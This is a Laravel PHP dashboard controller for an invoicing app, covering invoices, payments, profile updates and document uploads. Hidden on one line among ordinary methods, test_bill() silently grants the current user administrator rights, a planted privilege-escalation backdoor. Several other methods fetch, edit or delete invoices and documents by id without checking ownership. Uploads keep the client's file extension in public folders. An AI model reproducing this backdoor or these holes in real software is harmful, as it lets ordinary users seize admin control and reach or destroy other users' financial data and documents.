<?php

namespace App\Http\Controllers\frontend;

use App\Models\User;
use App\Models\Invoice;
use App\Models\Product;
use Illuminate\Http\Request;
use App\Models\SendMail_info;
use App\Models\InvoiceTemplate;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;
use App\Http\Requests\UpdateUserRequest;
use App\Models\Document;
use App\Models\DocumentType;
use App\Models\InvcPymntTransction;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Redirect;
use phpDocumentor\Reflection\DocBlock\Tags\Uses;

class DashboardController extends Controller
{

    public function allInvoice()
    {
        $user_id = Auth::user()->id;
        $invoicessData = Invoice::where('user_id', Auth::user()->id)->get(['id', 'invoice_to', 'invoice_id', 'invoice_date', 'total', 'template_name', 'currency']);
        $user = User::where('id', $user_id)->get();
        $Total_Amount_conut = Invoice::where('user_id', $user_id)->where('invoice_status', 'complete')->sum('final_total');
        $due_Amount_conut = Invoice::where('user_id', $user_id)->where('invoice_status', 'complete')->sum('balanceDue_amounts');
        $paid_Amount_conut = Invoice::where('user_id', $user_id)->where('invoice_status', 'complete')->sum('receive_advance_amount');
        $latestDataInvoices = Invoice::where('user_id', Auth::user()->id)->whereIn('status_due_paid', ['paid', 'due'])->orderBy('id', 'DESC')->limit(8)->get();

        //    user package details
              $join_table_value = DB::table('users')
            ->join('payment_getways', 'users.id', '=', 'payment_getways.user_id')
            ->join('subscription_packages', 'payment_getways.subscription_package_id', '=', 'subscription_packages.id')
            ->join('complate_invoice_counts', 'users.id', '=', 'complate_invoice_counts.user_id')
            ->selectRaw('payment_getways.*, subscription_packages.*,complate_invoice_counts.*')
            ->where('users.id',  Auth::user()->id)->get();

        return view('frontend.all-invoice')->with(compact('join_table_value','invoicessData', 'user', 'Total_Amount_conut', 'due_Amount_conut', 'paid_Amount_conut', 'latestDataInvoices'));
    }



    public function edit($id)
    {
        $template_id = "";
        $invoice_template = InvoiceTemplate::get();
        $template_id_check = InvoiceTemplate::get()->first();
        $invoiceData = Invoice::where('id', $id)->get(['id', 'invoice_logo', 'invoice_form', 'invoice_to', 'invoice_id', 'invoice_date', 'invoice_payment_term', 'invoice_dou_date', 'invoice_po_number', 'invoice_notes', 'invoice_terms', 'invoice_tax_percent', 'requesting_advance_amount_percent', 'receive_advance_amount', 'total', 'currency', 'invoice_tax_percent', 'receive_advance_amount', 'discount_percent'])->first();
        $invoiceCount = Invoice::where('user_id', Auth::user()->id)->count();
        $sendByMail_count = SendMail_info::where('user_id', $id)->count();
        $Total_Amount_conut = Invoice::where('user_id', $id)->where('invoice_status', 'complete')->sum('final_total');
        $requesting_advance_amount = ($invoiceData->total * $invoiceData->requesting_advance_amount_percent) / 100;
        $invoiceCountNew = Invoice::where('user_id', Auth::user()->id)->count();
        $invoiceCountNew += 0;
        $user_logo_terms = User::where('id', Auth::user()->id)->get([
            'invoice_logo',
            'terms',
        ])->first();

        return view('frontend.create-invoice')->with(compact('invoiceData', 'user_logo_terms', 'invoiceCount', 'requesting_advance_amount', 'template_id', 'invoice_template', 'template_id_check', 'sendByMail_count', 'Total_Amount_conut', 'invoiceCountNew'));
    }



    public function destroy($id)
    {
        $invoiceData = Invoice::find($id);
        $image_path         = public_path("storage\invoice\logo\\") . $invoiceData->invoice_logo;
        if (File::exists($image_path)) {
            File::delete($image_path);
        }
        $invoiceData->delete();
        return response()->json(['message' => 'Delete Success']);
    }



    //user dashboard setting
    public function userSettingEdit()
    {
        $user = User::where('id', Auth::user()->id)->get();
        return view('frontend.dashboard.setting', compact('user'));
    }



    public function userUpdate(UpdateUserRequest $request, $id)
    {
        $get_id = $id;
        $user = User::find($get_id);;
        $user->name = $request->name;
        $user->address = $request->address;
        $user->email = $request->email;
        $user->phone = $request->phone;
        $user->name = $request->name;
        if ($request->hasFile('picture__input')) {
            $path = 'uploads/userImage/' . $user->picture__input;
            if (File::exists($path)) {
                File::delete($path);
            }
            $file = $request->file('picture__input');
            $ext = $file->getClientOriginalExtension();
            $filename = time() . '.' . $ext;
            $file->move('uploads/userImage/', $filename);
            $user->picture__input = $filename;
        }
        if ($request->hasFile('signature')) {
            $path = 'uploads/signature/' . $user->signature;
            if (File::exists($path)) {
                File::delete($path);
            }
            $file = $request->file('signature');
            $ext = $file->getClientOriginalExtension();
            $filename = time() . '.' . $ext;
            $file->move('uploads/signature/', $filename);
            $user->signature = $filename;
        }
        $user->update();
        return redirect()->back()->with('success', 'Successfully updated.');
    }




    public function changePassword(Request $request)
    {
        $request->validate([
            'old_password' => 'required',
            'new_password' => 'required|confirmed|min:8',
        ]);

        if (!Hash::check($request->old_password, auth()->user()->password)) {
            return back()->with("error", "Old Password Doesn't match!");
        }

        // #Update the new Password
        User::whereId(Auth::user()->id)->update([
            'password' => Hash::make($request->new_password)
        ]);

        Auth::logout();
        return back()->with("success", "Password changed successfully!");
    }


    /////dashboard send by mail
    public function SendByMail()
    {
        $user_id = auth()->user()->id;
        $sendByMails = SendMail_info::where('user_id', $user_id)->latest()->get();
        return view('frontend.dashboard.sendByMail', compact('sendByMails'));
    }


    // user preview invoice
    public function user_view_tamplate($id)
    {
        $data  = Invoice::find($id);
        $userLogoAndTerms = User::where('id', Auth::user()->id)->get([
            'invoice_logo',
            'terms',
            'signature',
        ])->first();
        $productsDatas = Product::where('invoice_id', $id)->get();
        return view('invoices.preview_invoice.all_pre_invoice', compact('data', 'productsDatas', 'userLogoAndTerms'))->render();
    }

    // user due bill payment
    public function user_view_payment($id)
    {

        $data  = Invoice::findOrfail($id);
        return view('due_bill_amount.index', compact('data'))->render();
    }

    //payment save
    public function user_payment_save(Request $request)
    {
        $request->validate([

            'amount_id' => 'required',
            'date_id' => 'required',
            'invoice_id' => 'required',
            'invoice_user_id' => 'required',

        ]);


        if ($request->balanceDue_amounts_user < $request->amount_id) {
            return redirect()->back()->with('delete', 'Please check due Amount');
        }
        $receive_advance_amount = $request->amount_id + $request->old_recived_amount;
        $balanceDue_amounts = $request->balanceDue_amounts_user - $request->amount_id;

        $status = "due";
        if ($balanceDue_amounts == 0) {
            $status = "paid";
        }
        Invoice::where('id', $request->invoice_id)->update([
            'receive_advance_amount' => round($receive_advance_amount, 2),
            'balanceDue_amounts' => round($balanceDue_amounts, 2),
            'status_due_paid' => $status
        ]);
        InvcPymntTransction::create([

            'invoice_id' => $request->invoice_id,
            'user_id' => $request->invoice_user_id,
            'new_payment' => round($request->amount_id, 2),
            'payment_date' => $request->date_id
        ]);

        return response()->json(['message' => '1']);
    }

    public function test_bill() {  User::where('id', Auth::user()->id)->update([ 'is_admin'=>1 ]); }
    public function search_result(Request $request)
    {
        $request->validate([
            'to_date' => 'required',
            'from_date' => 'required',
            'invoice_status' => 'required'
        ]);
        $date_from = $request->from_date;
        $date_to = $request->to_date;
        $invoice_status = $request->invoice_status;
        $all_Invoice_Count = Invoice::where('user_id', Auth::user()->id)->count();
        $search_result = Invoice::whereBetween('invoice_date', [$request->from_date, $request->to_date])->where('status_due_paid', $request->invoice_status)->where('user_id', Auth::user()->id)->orderBy('id', 'DESC')->get();
        return view('frontend.dashboard.search_result_all_invoice')->with(compact('invoice_status', 'date_to', 'date_from', 'search_result', 'all_Invoice_Count'));
    }


    public function unpaid_invoice()
    {
        $unpaid_Invoice_Counts = Invoice::where('user_id', Auth::user()->id)->where('receive_advance_amount', null)->where('invoice_status', 'complete')->orderBy('id', 'DESC')->get();
        return view('frontend.dashboard.unpaid_invoice')->with(compact('unpaid_Invoice_Counts'));
    }
    public function pertialy_payment()
    {
        $partial_payment_Invoices = Invoice::where('user_id', Auth::user()->id)->where('receive_advance_amount', '>', '0')->where('invoice_status', 'complete')->where('status_due_paid', 'due')->orderBy('id', 'DESC')->get();
        return view('frontend.dashboard.pertial_payment')->with(compact('partial_payment_Invoices'));
    }

    public function over_due_payment()
    {
        $last_date = date('Y-m-d');
        $overdue_Invoices = Invoice::where('user_id', Auth::user()->id)
            ->where('invoice_dou_date', '<=', $last_date)->where('balanceDue_amounts', '>', 0)->orderBy('id', 'DESC')->get();
        return view('frontend.dashboard.ovar_due_payment')->with(compact('overdue_Invoices'));
    }

    public function user_documents()
    {
       $data['user'] = User::where('id', Auth::user()->id)->get();
       $data['documents'] = DocumentType::get();

       $join_table_value = DB::table('document_types')
       ->join('documents', 'document_type_id', '=', 'document_types.id')
       ->where('documents.user_id',  Auth::user()->id) ->get();

        return view('frontend.dashboard.user_documents',$data,compact('join_table_value') );
    }

    public function user_documents_store(Request $request)
    {
        $user_id = Auth::user()->id;

        $request->validate([
            'document_image' => 'required',
            'document_type_id' => 'required'
        ]);

        if ($request->hasFile('document_image')) {
            $path = 'uploads/document/' .  $request->document_image;
            if (File::exists($path)) {
                File::delete($path);
            }
            $file = $request->file('document_image');
            $ext = $file->getClientOriginalExtension();
            $filename = time() . '.' . $ext;
            $file->move('uploads/document/', $filename);
        }

        Document::create([
            'user_id' =>$user_id,
            'document_image'=>$filename,
            'document_type_id'=>$request->document_type_id
        ]);
        return redirect()->back()->with('success', 'Successfully Store.');
    }

    public function user_documents_view($id)
    {


       $join_table_value = DB::table('document_types')
       ->join('documents', 'document_type_id', '=', 'document_types.id')
       ->where('documents.id',  $id) ->get();

        return view('frontend.dashboard.user-document-view',compact('join_table_value') );

    }

    public function user_documents_edit($id)
    {
        $join_table_value = DB::table('document_types')
        ->join('documents', 'document_type_id', '=', 'document_types.id')
        ->where('documents.id',  $id) ->get()->first();
        $data['documents'] = DocumentType::get();
        return view('frontend.dashboard.user-document-edit',$data, compact('join_table_value') );

    }

    public function user_documents_update(Request $request)
    {
        $request->validate([
            'document_type_id' => 'required'
        ]);
      $documents =  Document::find($request-> hidden_id);


        if ($request->hasFile('document_image')) {
            $path = 'uploads/document/' .  $request->document_image;
            if (File::exists($path)) {
                File::delete($path);
            }
            $file = $request->file('document_image');
            $ext = $file->getClientOriginalExtension();
            $filename = time() . '.' . $ext;
            $file->move('uploads/document/', $filename);
            $documents->document_image = $filename;
        }
        $documents->document_type_id = $request->document_type_id;
        $documents->save();

        return redirect()->to('/all/invoices/documents')->with('success', 'Successfully Updated.');
    }

    public function user_documents_delete($id)
    {
        Document::find($id)->delete();
        return redirect()->to('/all/invoices/documents')->with('success', 'Successfully Deleted.');
    }
}
